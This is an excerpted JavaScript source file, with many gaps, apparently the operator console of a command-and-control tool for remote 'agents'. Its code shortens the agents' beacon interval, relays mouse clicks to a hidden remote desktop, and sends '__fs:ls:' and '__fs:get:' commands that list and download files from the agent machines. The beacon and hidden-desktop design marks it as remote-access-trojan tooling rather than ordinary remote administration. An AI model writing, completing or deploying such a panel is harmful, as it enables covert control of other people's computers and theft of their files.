...
(function() {
    ...
    function openConsole(agentId, focusDesktop) {
        if (!consoleTabs[agentId]) {
            ...
            pane.innerHTML =
                ...
                '<div class="hd-pane" id="hd-' + escapeHtml(agentId) + '">' +
                    '<div class="hd-bar">' +
                        ...
                        '<button type="button" class="glass-btn hd-turbo-btn" id="hd-turbo-' + escapeHtml(agentId) + '" title="Reduce beacon interval to 1s for faster interaction">Turbo</button>' +
                    '</div>' +
                ...
                '<div class="fs-pane" id="fs-' + escapeHtml(agentId) + '">' +
                    ...
                    '<div class="fs-table-wrap">' +
                        '<table class="fs-table" id="fs-list-' + escapeHtml(agentId) + '">' +
                            ...
                            '<tbody><tr><td colspan="4" style="text-align:center;opacity:.5;padding:12px">Press Go or ↻ to browse</td></tr></tbody>' +
                        '</table>' +
                    '</div>' +
                '</div>';
            ...
            var turboBtn = document.getElementById('hd-turbo-' + agentId);
            if (turboBtn) turboBtn.addEventListener('click', function() {
                var active = turboBtn.classList.toggle('active');
                if (active) {
                    api('POST', '/agents/' + agentId + '/command', { command: '__set_interval:1' });
                    desktopPollRate[agentId] = 800;
                    addEventLog('desktop', agentId + ' turbo ON (1s beacon)');
                } else {
                    api('POST', '/agents/' + agentId + '/command', { command: '__set_interval:5' });
                    desktopPollRate[agentId] = 2000;
                    addEventLog('desktop', agentId + ' turbo OFF (5s beacon)');
                }
            });
            ...
            var lastClickInfo = { time: 0, x: 0, y: 0 };
            function desktopClick(e, right) {
                ...
                var cw = img.width || 1280, ch = img.height || 800;
                var scaleX = rect.width / cw, scaleY = rect.height / ch;
                var scale = Math.min(scaleX, scaleY);
                var rendW = cw * scale, rendH = ch * scale;
                var offX = (rect.width - rendW) / 2, offY = (rect.height - rendH) / 2;
                var x = Math.round(((e.clientX - rect.left - offX) / rendW) * screen.w);
                var y = Math.round(((e.clientY - rect.top - offY) / rendH) * screen.h);
                if (x < 0) x = 0;
                if (y < 0) y = 0;
                if (x >= screen.w) x = screen.w - 1;
                if (y >= screen.h) y = screen.h - 1;
                var now = Date.now();
                var isDbl = !right && (now - lastClickInfo.time < 400) && Math.abs(x - lastClickInfo.x) < 10 && Math.abs(y - lastClickInfo.y) < 10;
                if (isDbl) { lastClickInfo.time = 0; } else { lastClickInfo = { time: now, x: x, y: y }; }
                var action = isDbl ? 'dblclick ' : (right ? 'rclick ' : 'click ');
                var status = document.getElementById('hd-status-' + agentId);
                if (status) status.textContent = action + x + ',' + y + ' (queued)';
                img.focus();
                if (img.tagName === 'CANVAS') {
                    var ctx = img.getContext('2d');
                    var cx = Math.round(x / screen.w * img.width);
                    var cy = Math.round(y / screen.h * img.height);
                    ctx.save();
                    ctx.beginPath();
                    ctx.arc(cx, cy, 6, 0, 2 * Math.PI);
                    ctx.fillStyle = isDbl ? 'rgba(255,200,0,0.8)' : (right ? 'rgba(0,120,255,0.7)' : 'rgba(255,60,60,0.7)');
                    ctx.fill();
                    ctx.restore();
                }
                desktopActionFor(agentId, action + x + ' ' + y);
            }
    ...
    async function listFiles(agentId) {
        ...
        await api('POST', '/agents/' + agentId + '/command', { command: '__fs:ls:' + path });
        addEventLog('files', 'list ' + path);
        var attempts = 0;
        var poll = setInterval(function() {
            attempts++;
            showFileList(agentId, path).then(function(found) {
                if (found || attempts >= 10) clearInterval(poll);
            });
        }, 2000);
    }
    ...
    async function showFileList(agentId, path) {
        ...
        var expectedCmd = '__fs:ls:' + path;
        for (var i = rows.length - 1; i >= 0; i--) {
            var cmd = rows[i].command || '';
            var out = rows[i].output || '';
            if (cmd === expectedCmd && out.indexOf('HDIMG:') !== 0 && out.indexOf('FILE:') !== 0) {
                var entries = [];
                ...
                tbody.querySelectorAll('.fs-entry').forEach(function(tr) {
                    ...
                    if (dlBtn) dlBtn.addEventListener('click', function(e) {
                        ...
                        var fname = tr.dataset.name;
                        dlBtn.textContent = '⌛';
                        dlBtn.disabled = true;
                        api('POST', '/agents/' + agentId + '/command', { command: '__fs:get:' + fpath });
                        addEventLog('files', 'download ' + fpath);
                        var dlAttempts = 0;
                        var dlPoll = setInterval(function() {
                            dlAttempts++;
                            if (dlAttempts > 20) {
                                clearInterval(dlPoll);
                                dlBtn.textContent = '✖';
                                dlBtn.disabled = false;
                                addEventLog('files', 'download timeout: ' + fname);
                                return;
                            }
                            saveRemoteFile(agentId, fname).then(function(ok) {
                                if (ok) {
                                    clearInterval(dlPoll);
                                    dlBtn.textContent = '✅';
                                    setTimeout(function() { dlBtn.textContent = '⬇'; dlBtn.disabled = false; }, 3000);
                                }
                            });
                        }, 2000);
                    });
    ...
    function showDesktopFrame(agentId, out) {
        ...
        try {
            ...
            next.onload = function() {
                ...
                if (status && status.textContent.indexOf('click') !== 0 && status.textContent.indexOf('rclick') !== 0 && status.textContent.indexOf('dblclick') !== 0) {
